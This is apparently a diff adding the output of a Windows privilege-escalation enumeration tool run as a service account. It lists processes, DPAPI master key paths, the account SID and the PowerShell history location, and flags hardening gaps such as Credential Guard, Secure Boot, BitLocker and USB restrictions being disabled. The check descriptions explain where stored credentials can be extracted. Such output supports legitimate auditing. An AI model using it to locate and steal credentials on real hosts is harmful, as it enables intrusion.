+Name                                                  Version         Path
+----                                                  -------         ----
+Microsoft Edge Update                                 1.3.315.17
+Microsoft SQL Server 17 (Microsoft SQL Server 2025...
+VMware Tools                                          12.4.5.23787635 C:\Program Files\VMware
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.006
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Applications - File Permissions                   ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ non-default or third-party applications.                     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:13.338
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Applications - Root Folder Permissions            ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any modification right on ┃
+┃ or within a folder located at the root of a 'fixed' drive.   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Path            : C:\Config.Msi
+Modifiable      : False
+ModifiablePaths :
+Vulnerable      : False
+Description     : The current user does not have modification rights on this root folder. This folder does not seem to contain any common application file.
+
+Path            : C:\inetpub
+Modifiable      : False
+ModifiablePaths :
+Vulnerable      : False
+Description     : The current user does not have modification rights on this root folder. This folder does not seem to contain any common application file.
+
+Path            : C:\SQL2025
+Modifiable      : False
+ModifiablePaths :
+Vulnerable      : False
+Description     : The current user does not have modification rights on this root folder. This folder does not seem to contain any common application file.
+
+Path            : C:\tracerbot
+Modifiable      : False
+ModifiablePaths :
+Vulnerable      : False
+Description     : The current user does not have modification rights on this root folder. This folder does not seem to contain any common application file.
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.330
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Applications - Startup Application Permissions    ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ system-wide applications that are run at startup for all     ┃
+┃ users.                                                       ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name         : VMware User Process
+Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VMware User Process
+Data         : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+IsModifiable : False
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.067
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Applications - Running Processes                  ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the currently running processes that   ┃
+┃ are not owned by the current user. Processes such as         ┃
+┃ 'svchost.exe' are filtered out.                              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+  Id SessionId Name          Path                                                      User
+  -- --------- ----          ----                                                      ----
+1120         0 conhost       C:\Windows\System32\conhost.exe
+3812         0 conhost       C:\Windows\System32\conhost.exe
+3876         0 conhost       C:\Windows\System32\conhost.exe
+3832         0 dllhost       C:\Windows\System32\dllhost.exe
+ 984         0 fontdrvhost   C:\Windows\System32\fontdrvhost.exe
+ 992         1 fontdrvhost   C:\Windows\System32\fontdrvhost.exe
+1512         1 LogonUI       C:\Windows\System32\LogonUI.exe
+ 840         0 lsass         C:\Windows\System32\lsass.exe
+6660         0 ollama
+2324         0 powershell    C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
+2628         0 powershell    C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
+5100         0 SQLAGENT
+5428         0 sqlceip
+2080         0 sqlwriter
+2512         0 VGAuthService
+3088         0 vm3dservice   C:\Windows\System32\vm3dservice.exe
+3452         1 vm3dservice   C:\Windows\System32\vm3dservice.exe
+2616         0 vmtoolsd
+ 676         0 wininit       C:\Windows\System32\wininit.exe
+ 744         1 winlogon      C:\Windows\System32\winlogon.exe
+3912         0 WmiPrvSE      C:\WINDOWS\System32\Wbem\WmiPrvSE.exe
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.076
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Scheduled Tasks - Image File Permissions          ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ a scheduled task's binary or its folder. Note that           ┃
+┃ low-privileged users cannot list all the scheduled tasks.    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:02.902
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Scheduled Tasks - Hardcoded Credentials           ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are scheduled tasks configured with      ┃
+┃ hardcoded credentials (logon type 'Password'), in which case ┃
+┃ the user account's password is stored in a reversible format ┃
+┃ in the registry, and can be extracted with administrator     ┃
+┃ privileges.                                                  ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.005
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - Hive File Permissions               ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has read permissions on the   ┃
+┃ SAM/SYSTEM/SECURITY hive files, either in the system folder  ┃
+┃ or in volume shadow copies (CVE-2021-36934 - HiveNightmare). ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+WARNING: NtOpenSymbolicLinkObject('\Device\BootDevice') - Access is denied (5)
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.333
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - Unattend Files                      ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are any 'unattend' files and whether     ┃
+┃ they contain clear-text credentials.                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.004
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - WinLogon                            ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the 'WinLogon' registry key contains           ┃
+┃ clear-text credentials. Note that entries with an empty      ┃
+┃ password field are filtered out.                             ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.003
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - DPAPI Master Keys                   ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the current user's DPAPI master keys.  ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+FullName       : C:\Users\svc_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-2554513647-1216688035-3073314765-1003\05fb9283-75b6-46d4-8a5b-43fa7ad960c4
+Id             : 05fb9283-75b6-46d4-8a5b-43fa7ad960c4
+LastAccessTime : 2026-08-25 - 03:07:34
+LastWriteTime  : 2026-08-25 - 01:39:37
+
+FullName       : C:\Users\svc_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-2554513647-1216688035-3073314765-1003\3f9dc0af-719d-4f3d-8c64-abb6579d66c3
+Id             : 3f9dc0af-719d-4f3d-8c64-abb6579d66c3
+LastAccessTime : 2026-11-12 - 12:59:47
+LastWriteTime  : 2026-08-25 - 03:07:34
+
+FullName       : C:\Users\svc_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-2554513647-1216688035-3073314765-1003\4B7D9AD7-43E2-4954-90B2-CF66EE5979BF
+Id             : 4b7d9ad7-43e2-4954-90b2-cf66ee5979bf
+LastAccessTime : 2026-08-19 - 15:45:49
+LastWriteTime  : 2026-08-19 - 15:45:49
+
+FullName       : C:\Users\svc_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-2554513647-1216688035-3073314765-1003\4fc7aaaf-f4f4-45b1-abb7-9701429481aa
+Id             : 4fc7aaaf-f4f4-45b1-abb7-9701429481aa
+LastAccessTime : 2026-11-12 - 04:30:05
+LastWriteTime  : 2026-08-19 - 15:45:49
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.017
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - DPAPI Credential Files              ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the current user's DPAPI credential    ┃
+┃ files.                                                       ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.003
+[*] SUMMARY : No summary available yet.
+
+
+WARNING: [MAIN] Check 'Credentials - Vault (creds)' is categorized as risky, but the option '-Risky' was not specified, ignoring...
+WARNING: [MAIN] Check 'Credentials - Vault (list)' is categorized as risky, but the option '-Risky' was not specified, ignoring...
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - Group Policy Preferences (GPP)      ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are cached Group Policy Preference (GPP) ┃
+┃ files that contain clear-text passwords.                     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.006
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - PowerShell History                  ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user's PowerShell history contains ┃
+┃ any clear-text credentials. Note that this check follows a   ┃
+┃ keyword-based approach and thus might not be completely      ┃
+┃ reliable.                                                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Path          : C:\Users\svc_sql\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+CreationTime  : 11/12/2026 12:40:51 PM
+LastWriteTime : 11/13/2026 1:33:02 AM
+Lines         : 47
+Matches       : 0
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.008
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - SCCM Network Access Account (NAA)   ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether SCCM NAA credentials are stored in the WMI     ┃
+┃ repository. If so, the username and password DPAPI blobs are ┃
+┃ returned, but can only be decrypted using the SYSTEM's DPAPI ┃
+┃ user key.                                                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.457
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - SCCM Cache Folder                   ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the SCCM cache folders contain files with      ┃
+┃ potentially hard coded credentials, or secrets, using basic  ┃
+┃ keywords such as 'password', or 'secret'.                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.005
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - Symantec Account Connectivity       ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether a Symantec Management Agent (SMA) is installed ┃
+┃ and whether Account Connectivity Credentials (ACCs) are      ┃
+┃ stored locally.                                              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.003
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - SCOM Run As Account                 ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the event logs contain traces of SCOM Run As   ┃
+┃ accounts being used locally. If so, the clear-text           ┃
+┃ credentials of those accounts can be extracted from the      ┃
+┃ registry with administrator privileges.                      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.018
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - VNC Server Password                 ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether a well-known VNC server (RealVNC, TigerVNC,    ┃
+┃ TightVNC, UltraVNC) is installed. If so, it attempts to read ┃
+┃ and decrypt the encrypted password. Note that this might     ┃
+┃ require administrator privileges.                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.007
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Credentials - Personal Certificates               ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about machine and user personal              ┃
+┃ certificates. Those certificates can be found in the         ┃
+┃ registry and on the filesystem in each user's home folder.   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.011
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Hardening - LSA Protection                        ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether LSA protection is enabled. Note that when LSA  ┃
+┃ protection is enabled, 'lsass.exe' runs as a Protected       ┃
+┃ Process Light (PPL) and thus can only be accessed by other   ┃
+┃ protected processes with an equivalent or higher protection  ┃
+┃ level.                                                       ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Key          : HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+RunAsPPL     : 2
+RunAsPPLBoot : 2
+Description  : LSA Protection is enabled without UEFI lock (i.e. the feature is not backed by a UEFI variable).
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.007
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Hardening - Credential Guard                      ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether Credential Guard is supported and enabled.     ┃
+┃ Note that when Credential Guard is enabled, credentials are  ┃
+┃ stored in an isolated process ('LsaIso.exe') that cannot be  ┃
+┃ accessed, even if the kernel is compromised.                 ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+LsaCfgFlagsPolicyKey       : HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
+LsaCfgFlagsPolicyValue     : LsaCfgFlags
+LsaCfgFlagsPolicyData      : (null)
+LsaCfgFlagsKey             : HKLM\SYSTEM\CurrentControlSet\Control\LSA
+LsaCfgFlagsValue           : LsaCfgFlags
+LsaCfgFlagsData            : (null)
+LsaCfgFlagsDescription     : Credential Guard is not configured.
+CredentialGuardConfigured  : False
+CredentialGuardRunning     : False
+CredentialGuardDescription : Credential Guard is not configured. Credential Guard is not running.
+
+
+
+[*] STATUS  : VULNERABLE (Low)
+[*] TIME    : 00:00:00.115
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0005 - Defense Evasion                          ┃
+┃ NAME     ┃ Hardening - Attack Surface Reduction (ASR)        ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about configured Windows Defender Exploit    ┃
+┃ Guard Attack Surface Reduction (ASR) rules.                  ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.038
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0003 - Persistence                              ┃
+┃ NAME     ┃ Hardening - UEFI & Secure Boot                    ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether UEFI and Secure Boot are supported and         ┃
+┃ enabled. Note that Secure Boot requires UEFI.                ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Name        Vulnerable Description
+----        ---------- -----------
+UEFI             False BIOS mode is UEFI.
+Secure Boot       True Secure Boot is not enabled.
+
+
+[*] STATUS  : VULNERABLE (Low)
+[*] TIME    : 00:00:00.016
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0008 - Lateral Movement                         ┃
+┃ NAME     ┃ Hardening - LAPS                                  ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether LAPS is configured and enabled. Note that this ┃
+┃ applies to domain-joined machines only.                      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Description : The machine is not domain-joined, this check is irrelevant.
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.024
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Misc - TPM Device Information                     ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the machine's Trusted Platform Module  ┃
+┃ (TPM), if present.                                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+WARNING: No TPM device found.
+
+
+TpmPresent : False
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.013
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0001 - Initial Access                           ┃
+┃ NAME     ┃ Hardening - BitLocker                             ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether BitLocker is enabled on the system drive and   ┃
+┃ requires a second factor of authentication (PIN or startup   ┃
+┃ key). Note that this check might yield a false positive if a ┃
+┃ third-party drive encryption software is installed.          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+WARNING: No TPM device found.
+
+
+MachineRole : Workstation
+TpmPresent  : False
+Encrypted   : False
+Description : BitLocker is not enabled. The machine does not seem to be equipped with a TPM, this check is probably irrelevant.
+
+
+
+[*] STATUS  : VULNERABLE (Low)
+[*] TIME    : 00:00:00.021
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Hardening - Device Installation Restrictions      ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether USB device installation restrictions are       ┃
+┃ enforced. If not, or if the policy applied is too            ┃
+┃ permissive, an attacker with physical access could           ┃
+┃ compromise the computer by emulating arbitrary USB devices   ┃
+┃ and exploiting known vulnerable PnP drivers (Plug & Pwn).    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name        : DenyDeviceClasses
+DisplayName : Prevent installation of devices using drivers that match these device setup classes
+State       : Not Configured
+
+Name        : DenyDeviceIDs
+DisplayName : Prevent installation of devices that match any of these device IDs
+State       : Not Configured
+
+Name        : DenyInstanceIDs
+DisplayName : Prevent installation of devices that match any of these device instance IDs
+State       : Not Configured
+
+Name        : DenyRemovableDevices
+DisplayName : Prevent installation of removable devices
+State       : Not Configured
+
+Name        : DenyUnspecified
+DisplayName : Prevent installation of devices not described by other policy settings (deprecated)
+State       : Not Configured
+
+Name        : AllowDenyLayered
+DisplayName : Apply layered order of evaluation for Allow and Prevent device installation policies across all device match criteria
+State       : Not Configured
+
+Name        : AllowDeviceClasses
+DisplayName : Allow installation of devices using drivers that match these device setup classes
+State       : Not Configured
+
+Name        : AllowDeviceIDs
+DisplayName : Allow installation of devices that match any of these device IDs
+State       : Not Configured
+
+Name        : AllowInstanceIDs
+DisplayName : Allow installation of devices that match any of these device IDs
+State       : Not Configured
+
+
+
+[*] STATUS  : VULNERABLE (Medium)
+[*] TIME    : 00:00:00.068
+[*] SUMMARY : No Deny policy is defined. The current session is not the 'Console' session. Exploitation is less likely.
+
